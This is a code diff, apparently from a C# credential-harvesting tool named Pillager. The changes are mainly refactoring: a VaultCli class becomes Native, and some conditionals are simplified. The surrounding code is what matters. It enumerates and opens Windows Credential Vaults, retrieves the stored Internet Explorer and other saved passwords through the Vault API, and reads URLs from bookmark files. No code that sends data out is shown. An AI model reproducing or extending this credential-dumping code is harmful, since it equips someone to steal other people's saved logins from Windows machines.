@@ -25,8 +25,7 @@ namespace Pillager.Browsers
         {
             if (IntPtr.Size == 4)
             {
-                bool is64Bit;
-                IsWow64Process(GetCurrentProcess(), out is64Bit);
+                IsWow64Process(GetCurrentProcess(), out var is64Bit);
                 if (is64Bit)
                 {
                     return "Don't support recovery IE password from wow64 process";
@@ -41,18 +40,18 @@ namespace Pillager.Browsers
 
             if (OSMajor >= 6 && OSMinor >= 2)
             {
-                VAULT_ITEM = typeof(VaultCli.VAULT_ITEM_WIN8);
+                VAULT_ITEM = typeof(Native.VAULT_ITEM_WIN8);
             }
             else
             {
-                VAULT_ITEM = typeof(VaultCli.VAULT_ITEM_WIN7);
+                VAULT_ITEM = typeof(Native.VAULT_ITEM_WIN7);
             }
 
             /* Helper function to extract the ItemValue field from a VAULT_ITEM_ELEMENT struct */
             object GetVaultElementValue(IntPtr vaultElementPtr)
             {
                 object results;
-                object partialElement = Marshal.PtrToStructure(vaultElementPtr, typeof(VaultCli.VAULT_ITEM_ELEMENT));
+                object partialElement = Marshal.PtrToStructure(vaultElementPtr, typeof(Native.VAULT_ITEM_ELEMENT));
                 FieldInfo partialElementInfo = partialElement.GetType().GetField("Type");
                 var partialElementType = partialElementInfo.GetValue(partialElement);
 
@@ -102,9 +101,9 @@ namespace Pillager.Browsers
 
             Int32 vaultCount = 0;
             IntPtr vaultGuidPtr = IntPtr.Zero;
-            var result = VaultCli.VaultEnumerateVaults(0, ref vaultCount, ref vaultGuidPtr);
+            var result = Native.VaultEnumerateVaults(0, ref vaultCount, ref vaultGuidPtr);
 
-            if ((int)result != 0)
+            if (result != 0)
             {
                 throw new Exception("[ERROR] Unable to enumerate vaults. Error (0x" + result.ToString() + ")");
             }
@@ -132,15 +131,8 @@ namespace Pillager.Browsers
                 guidAddress = (IntPtr)(guidAddress.ToInt64() + Marshal.SizeOf(typeof(Guid)));
                 IntPtr vaultHandle = IntPtr.Zero;
                 string vaultType;
-                if (vaultSchema.ContainsKey(vaultGuid))
-                {
-                    vaultType = vaultSchema[vaultGuid];
-                }
-                else
-                {
-                    vaultType = vaultGuid.ToString();
-                }
-                result = VaultCli.VaultOpenVault(ref vaultGuid, (UInt32)0, ref vaultHandle);
+                vaultType = vaultSchema.ContainsKey(vaultGuid) ? vaultSchema[vaultGuid] : vaultGuid.ToString();
+                result = Native.VaultOpenVault(ref vaultGuid, 0, ref vaultHandle);
                 if (result != 0)
                 {
                     throw new Exception("Unable to open the following vault: " + vaultType + ". Error: 0x" + result.ToString());
@@ -150,7 +142,7 @@ namespace Pillager.Browsers
                 // Fetch all items within Vault
                 int vaultItemCount = 0;
                 IntPtr vaultItemPtr = IntPtr.Zero;
-                result = VaultCli.VaultEnumerateItems(vaultHandle, 512, ref vaultItemCount, ref vaultItemPtr);
+                result = Native.VaultEnumerateItems(vaultHandle, 512, ref vaultItemCount, ref vaultItemPtr);
                 if (result != 0)
                 {
                     throw new Exception("[ERROR] Unable to enumerate vault items from the following vault: " + vaultType + ". Error 0x" + result.ToString());
@@ -176,18 +168,17 @@ namespace Pillager.Browsers
                         FieldInfo dateTimeInfo = currentItem.GetType().GetField("LastModified");
                         UInt64 lastModified = (UInt64)dateTimeInfo.GetValue(currentItem);
 
-                        object[] vaultGetItemArgs;
                         IntPtr pPackageSid = IntPtr.Zero;
                         if (OSMajor >= 6 && OSMinor >= 2)
                         {
                             // Newer versions have package sid
                             FieldInfo pPackageSidInfo = currentItem.GetType().GetField("pPackageSid");
                             pPackageSid = (IntPtr)pPackageSidInfo.GetValue(currentItem);
-                            result = VaultCli.VaultGetItem_WIN8(vaultHandle, ref schemaId, pResourceElement, pIdentityElement, pPackageSid, IntPtr.Zero, 0, ref passwordVaultItem);
+                            result = Native.VaultGetItem_WIN8(vaultHandle, ref schemaId, pResourceElement, pIdentityElement, pPackageSid, IntPtr.Zero, 0, ref passwordVaultItem);
                         }
                         else
                         {
-                            result = VaultCli.VaultGetItem_WIN7(vaultHandle, ref schemaId, pResourceElement, pIdentityElement, IntPtr.Zero, 0, ref passwordVaultItem);
+                            result = Native.VaultGetItem_WIN7(vaultHandle, ref schemaId, pResourceElement, pIdentityElement, IntPtr.Zero, 0, ref passwordVaultItem);
                         }
 
                         if (result != 0)
@@ -200,7 +191,7 @@ namespace Pillager.Browsers
                         // Fetch the credential from the authenticator element
                         object cred = GetVaultElementValue(pAuthenticatorElement);
                         object packageSid = null;
-                        if (pPackageSid != IntPtr.Zero && pPackageSid != null)
+                        if (pPackageSid != IntPtr.Zero)
                         {
                             packageSid = GetVaultElementValue(pPackageSid);
                         }
@@ -266,7 +257,7 @@ namespace Pillager.Browsers
 
             foreach (string url_file_path in files)
             {
-                if (File.Exists(url_file_path) == true)
+                if (File.Exists(url_file_path))
                 {
                     string booktext = File.ReadAllText(url_file_path);
                     Match match = Regex.Match(booktext, @"URL=(.*?)\n");
